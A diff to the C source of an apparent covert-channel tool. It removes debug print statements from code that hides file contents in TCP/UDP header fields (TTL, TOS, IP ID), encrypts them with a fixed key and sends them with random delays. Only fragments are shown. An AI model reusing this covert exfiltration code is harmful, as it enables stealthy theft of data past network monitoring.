@@ -22,8 +22,6 @@ void recv_results(char* sip, unsigned short sport, char* filename, bool tcp) {
     FILE* file;
     char input;
 
-    printf("listening for results\n\n");
-
     if((file = fopen(filename, "wb")) == NULL) {
         perror("fopen can't open file");
         exit(1);
@@ -62,7 +60,6 @@ void send_results(char *sip, char *dip, unsigned short sport, unsigned short dpo
     }
 
     while((input = fgetc(file)) != EOF) {
-        printf("Character to send: %d\n", input);
         if(tcp){
             covert_send(sip, dip, sport, dport, (unsigned char *) &input, 1); //send the packet
         } else {
@@ -71,13 +68,11 @@ void send_results(char *sip, char *dip, unsigned short sport, unsigned short dpo
         start = clock();    //start of clock
         timer_complete = 0;    //reset the timer again
         delay = rand_delay(max_delay);
-        printf("delay: %d\n", delay);
 
         //wait for the timer to complete
         while(timer_complete == 0) {
             passed = (clock() - start) / CLOCKS_PER_SEC;
             if(passed >= delay) {
-                printf("Delay completed\n");
                 timer_complete = 1;
             }
         }
@@ -89,8 +84,6 @@ void send_results(char *sip, char *dip, unsigned short sport, unsigned short dpo
     } else {
         covert_udp_send(sip, dip, sport, dport, (unsigned char *) &input, 3);
     }
-
-    printf("completed\n");
     fclose(file);
 }
 
@@ -107,7 +100,6 @@ void covert_udp_send_data(char *sip, char *dip, unsigned short sport, unsigned s
     }
 
     for(int i = 0; i<= (int)strlen(data); i++){
-        printf("data[%d] = %c\n",i,data[i]);
         covert_udp_send(sip,dip,sport,dport,(unsigned char*) &data[i],1);
     }
     //end of file
@@ -289,8 +281,6 @@ void covert_send(char *sip, char *dip, unsigned short sport, unsigned short dpor
     packet.tcp.urg_ptr = 0;
 
     memset(packet.buffer, 0, sizeof(packet.buffer));
-    printf("sizeof message to send: %lu\n", strlen((const char*) data));
-    printf("message: %s\n", data);
     encryptMessage(data, BUFSIZE + 1, (unsigned char*) KEY, (unsigned char*) IV, packet.buffer);
 //    printf("Ciphertext(%lu): %s\n", sizeof(packet.buffer), packet.buffer);
 
@@ -327,7 +317,6 @@ void covert_send(char *sip, char *dip, unsigned short sport, unsigned short dpor
     //if((bytes_sent = send(sending_socket, &packet, 40, 0, (struct sockaddr *)&sin, sizeof(sin))) < 0) {
         perror("sendto");
     }
-    printf("Sending Data(%d)\n\n\n", bytes_sent);
 }
 char covert_udp_recv(char *sip, int sport, bool ttl, bool tos, bool ipid) {
     struct sockaddr_in sin;
@@ -362,10 +351,8 @@ char covert_udp_recv(char *sip, int sport, bool ttl, bool tos, bool ipid) {
     struct iphdr *ip_header = (struct iphdr *) datagram;
     struct udphdr *udp_header = (struct udphdr *) (datagram + sizeof(struct iphdr));
     if(ip_header->ttl == 'x' && ip_header->tos == 'x' && ip_header->id == 'x' && ntohs(udp_header->dest) == sport){
-        printf("port: %d\n", ntohs(udp_header->dest));
         return -1;
     } else if(ip_header->tos == 'l' && ip_header->id == 'b' && ntohs(udp_header->dest) == sport) {
-        printf("port: %d\n", ntohs(udp_header->dest));
         return ip_header->ttl;
     }
     /*
@@ -399,7 +386,7 @@ char covert_recv(char *sip, unsigned short sport, int ipid, int seq, int ack, in
     } else if(recv_tcp.tcp.source == sport){
         return recv_tcp.ip.id;
     }
-
+/*
     if(sport == 0) {    //from any port
         if((recv_tcp.tcp.syn == 1) && (recv_tcp.ip.saddr == sip_binary)) {
             if(ipid == 1) {
@@ -457,7 +444,7 @@ char covert_recv(char *sip, unsigned short sport, int ipid, int seq, int ack, in
                 return recv_tcp.tcp.ack_seq;
             }
         }
-    }
+    }*/
 
     close(recv_socket);
     return 0;
